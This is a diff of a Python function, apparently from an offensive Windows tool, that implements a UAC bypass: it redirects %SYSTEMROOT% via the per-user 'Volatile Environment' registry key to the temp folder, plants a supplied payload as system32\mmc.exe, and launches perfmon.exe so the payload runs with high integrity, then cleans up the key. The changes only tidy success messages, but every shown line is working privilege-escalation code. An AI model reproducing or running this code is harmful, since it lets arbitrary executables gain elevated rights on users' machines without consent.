@@ -27,23 +27,17 @@ def perfmon(payload):
  spawned with high IL.
  -------------------------------------------------------------
  """
- 
 	print_info("Payload: {}".format(payload))
 	print_info("Attempting to change %systemroot% through volatile environment")
 	try:
-		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-								os.path.join("Volatile Environment"))
-								
-		_winreg.SetValueEx(key,
-							"SYSTEMROOT",
-							0,
-							_winreg.REG_SZ,
-							tempfile.gettempdir())
+		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Volatile Environment"))					
+		_winreg.SetValueEx(key,"SYSTEMROOT",0,_winreg.REG_SZ,tempfile.gettempdir())
 		_winreg.CloseKey(key)
-		print_success("Registry %systemroot% key was created")
 	except Exception as error:
 		print_error("Unable to create %systemroot% key")
 		return False
+	else:
+		print_success("Registry %systemroot% key was created")
 
 	try:
 		if ((os.path.exists(os.path.join(tempfile.gettempdir(),"system32"))) == True):
@@ -68,29 +62,31 @@ def perfmon(payload):
 
 	try:
 		os.makedirs(os.path.join(tempfile.gettempdir(),"system32"))
-		print_success("Successfully created temp directory")
 	except Exception as error:
 		print_error("Unable to create folder")
 		return False
+	else:
+		print_success("Successfully created temp directory")
 	
 	print_info("Pausing for 5 seconds before copy")
 	time.sleep(5)
 
 	try:
 		shutil.copy(payload,os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))
-		print_success("Successfully copied: {} to: {}".format(payload,os.path.join(tempfile.gettempdir(),"system32\mmc.exe")))
 	except shutil.Error as error:
 		print_error("Unable to copy: {}".format(payload))
 		return False
 	except IOError as error:
 		print_error("Unable to copy: {}".format(payload))
 		return False
+	else:
+		print_success("Successfully copied: {} to: {}".format(payload,os.path.join(tempfile.gettempdir(),"system32\mmc.exe")))
 
 	print_info("Pausing for 5 seconds before executing")
 	time.sleep(5)
 
 	print_info("Attempting to create process")
-	try:
+	try:		
 		if (os.system("perfmon.exe") == 0):
 			print_success("Process started successfully")
 		else:
@@ -105,11 +101,10 @@ def perfmon(payload):
 
 	print_info("Attempting to remove %systemroot% registry key")	
 	try:
-		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-								os.path.join("Volatile Environment"))
-		_winreg.DeleteValue(key,
-							"SYSTEMROOT")
-		print_success("Registry %systemroot% key was deleted")
+		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Volatile Environment"))
+		_winreg.DeleteValue(key,"SYSTEMROOT")
 	except Exception as error:
 		print_error("Unable to delete %systemroot% registry key")
 		return False
+	else:
+		print_success("Registry %systemroot% key was deleted")
